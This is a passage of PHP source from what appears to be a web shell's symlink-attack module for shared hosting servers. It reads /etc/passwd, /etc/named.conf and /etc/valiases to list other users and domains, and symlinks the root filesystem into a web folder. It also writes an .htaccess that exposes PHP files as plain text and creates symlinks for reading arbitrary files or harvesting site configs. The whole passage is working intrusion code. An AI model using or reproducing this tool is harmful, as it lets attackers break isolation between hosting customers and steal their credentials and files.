						echo "<table align=center border=1 style='width:40%;'><tr><td align=center><font size=4 color=red>Domains</font></td><td align=center><font size=4 color=red>Users</font></td><td align=center><font size=4 color=red>Symlink</font></td></tr>";
					
				foreach($d0mains as $d0main)
				{
					if(eregi("zone",$d0main))
					{
						preg_match_all('#zone "(.*)"#', $d0main, $domains);
						flush();
							
						if(strlen(trim($domains[1][0])) > 2)
						{ 
							$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
							flush();
							
$site = $user['name'] ;


@symlink("/","ROOT/root");

$site = $domains[1][0];

$ir = 'ir';

$il = 'il';

if (preg_match("/.^$ir/",$domains[1][0]) or preg_match("/.^$il/",$domains[1][0]) )
{
$site = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$domains[1][0]."</div>";
}


echo "
<tr>

<td>
<div class='d0main'><a target='_blank' href=http://www.".$domains[1][0]."/><font size=3 color=#0066FF>".$site." </font></a> </div>
</td>


<td><font size=3 color=#FF0000>".$user['name']."</font></td>






<td>
<a href='ROOT/root/home/".$user['name']."/public_html' target='_blank'><font size=3 color=#0066FF>Symlink</font> </a>
</td>


</tr></div> ";


flush();
flush();

						}
					}
				}
				echo "</table>";
			}
			else
			{
					$TEST=@file('/etc/passwd');
					if ($TEST) 
					{
						@mkdir("ROOT",0777);
						@chdir("ROOT");
						execmd("ln -s / root");
						$file3 = 'Options all 
			 DirectoryIndex Sux.html 
			 AddType text/plain .php 
			 AddHandler server-parsed .php 
			  AddType text/plain .html 
			 AddHandler txt .html 
			 Require None 
			 Satisfy Any        
			';
						$fp3 = fopen('.htaccess','w');
						$fw3 = fwrite($fp3,$file3);
						@fclose($fp3);
						
						echo "<table align=center border=1 style='width:40%;'><tr><td align=center><font size=4 color=red>Users</font></td><td align=center><font size=4 color=red>Symlink</font></td></tr>";
						
						$file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
						//Output a line of the file until the end is reached
						while(!feof($file))
						{
							$s = fgets($file);
							$matches = array();
							$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
							$matches = str_replace("home/","",$matches[1]);
							if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
								continue;
							echo "<tr><td align=center><font size=3 color=lime>" . $matches . "</td>";
						    echo "<td align=center><font size=3 color=lime><a href=/ROOT/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
						}
						fclose($file);
						
						echo "</table>";
					}
					else
					{
						
						@mkdir("ROOT",0777);
						@chdir("ROOT");
						execmd("ln -s / root");
						$file3 = 'Options all 
			 DirectoryIndex Sux.html 
			 AddType text/plain .php 
			 AddHandler server-parsed .php 
			  AddType text/plain .html 
			 AddHandler txt .html 
			 Require None 
			 Satisfy Any        
			';
						$fp3 = fopen('.htaccess','w');
						$fw3 = fwrite($fp3,$file3);
						@fclose($fp3);
						
						echo "<table align=center border=1 style='width:40%;'><tr><td align=center><font size=4 color=red>Users</font></td><td align=center><font size=4 color=red>Symlink</font></td></tr>";
						
						$temp = "";
						$val1 = 0;
						$val2 = 1000;
						for(;$val1 <= $val2;$val1++) 
						{
							$uid = @posix_getpwuid($val1);
							if ($uid)
								 $temp .= join(':',$uid)."\n";
						 }
						 echo '<br/>';
						 $temp = trim($temp);
						 
						 $file5 = fopen("test.txt","w");
						 fputs($file5,$temp);
						 fclose($file5);
						 
						 $file = fopen("test.txt", "r") or exit("Unable to open file!");
						 while(!feof($file))
						 {
						 	$s = fgets($file);
							$matches = array();
							$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
							$matches = str_replace("home/","",$matches[1]);
							if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
								continue;
							echo "<tr><td align=center><font size=3 color=lime>" . $matches . "</td>";
						    echo "<td align=center><font size=3 color=lime><a href=/ROOT/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
						 }
						fclose($file);
						echo "</table>";
						unlink("test.txt");
					}
				}
			}
			else if(isset($_GET["symlinkfile"])) 
			{
				if(!isset($_GET['file']))
				{
					?>
					<center>
					<form action="<?php echo $self; ?>">
					<input type="hidden" name="symlinkserver">
					<input type="hidden" name="symlinkfile">
					<input type="text" class="box" name="file" size="50" value="">
					<input type="submit" value="Create Symlink" class="but">
					</form></center>
					<br><br>
					<?php
				}
				else
				{
					$fakedir="fake";
					$fakedep=16;
					
					$num=0; // offset of symlink.$num
					
					if(!empty($_GET['file'])) $file=$_GET['file'];
					else if(!empty($_POST['file'])) $file=$_POST['file'];
					else $file="";
										
					if(empty($file))
						exit;
					
					if(!is_writable("."))
						die("not writable directory");
					
					$level=0;
					
					for($as=0;$as<$fakedep;$as++){
						if(!file_exists($fakedir))
							mkdir($fakedir);
						chdir($fakedir);
					}
					
					while(1<$as--) chdir("..");
					
					$hardstyle = explode("/", $file);
					
					for($a=0;$a<count($hardstyle);$a++){
					if(!empty($hardstyle[$a])){
						if(!file_exists($hardstyle[$a])) 
							mkdir($hardstyle[$a]);
						chdir($hardstyle[$a]);
						$as++;
					}
				}
			$as++;
			while($as--)
					chdir("..");
				
				@rmdir("fakesymlink");
				@unlink("fakesymlink");
				
				@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink");
				
				// this loop will skip all ready created symlinks.
				while(1)
					if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$file, "symlink".$num))) break;
					else $num++;
				
				@unlink("fakesymlink");
				mkdir("fakesymlink");
					
				die('<FONT COLOR="RED">check symlink <a href="./symlink'.$num.'">symlink'.$num.'</a> file</FONT>');
				
			}
		}
		else if(isset($_REQUEST["script"])) 
		{
		
			?>
			
			
			<center><table><tr><td><a href="<?php echo $self; ?>?manually&script&symlinkserver"><font color="#3366FF" size="4">| Do It Manually |</font></a></td>
		<td><a href="<?php echo $self; ?>?automatic&script&symlinkserver"><font color="#3366FF" size="4">| Do It Automatically |</font></a></td>
		</tr></table></center>
			<?php
			if(isset($_REQUEST['manually']))
			{
				if(!isset($_REQUEST['passwd']))
				{
				?>
				<center>
				<form action="<?php echo $self; ?>" method="post">
				<input type="hidden" name="manually">
				<input type="hidden" name="script">
				<input type="hidden" name="symlinkserver">
				<textarea class="box" rows="16" cols="100" name="passwd"></textarea><br>
				<input type="submit" value="Get Config" class="but">
				</form>
				</center>
				<?php
				}
				else
				{
					$getetc = trim($_REQUEST['passwd']);
					
					mkdir("m0bil3");
					chdir("m0bil3");
					
					$myfile = fopen("test.txt","w");
					fputs($myfile,$getetc);
					fclose($myfile);
						 
					$file = fopen("test.txt", "r") or exit("Unable to open file!");
					while(!feof($file))
					{
					 	$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
								continue;
							syml($matches,$matches);
					}
					fclose($file);
					unlink("test.txt");
					echo "<center><font color=#3366FF size=3>[ Done ]</font></center>";
					echo "<br><center><a href=m0bil3_xT target=_blank><font size=3 color=#3366FF>| Go Here |</font></a></center>"; 
				}
			}
			else if(isset($_REQUEST['automatic']))
			{
				$d0mains = @file("/etc/named.conf");
		
				if($d0mains)
				{
					mkdir("m0bil3");
					chdir("m0bil3");
										
					foreach($d0mains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
								
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<center><font color=#3366FF size=3>[ Done ]</font></center>";
					echo "<br><center><a href=m0bil3_xT target=_blank><font size=3 color=#3366FF>| Go Here |</font></a></center>"; 
				}
				else
				{
					mkdir("m0bil3");
					chdir("m0bil3");
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);
					 
					 $file = fopen("test.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
					echo "<center><font color=#3366FF size=3>[ Done ]</font></center>";
					echo "<br><center><a href=m0bil3_xT target=_blank><font size=3 color=#3366FF>| Go Here |</font></a></center>"; 
				}
			}
		}
	}	
	}
?>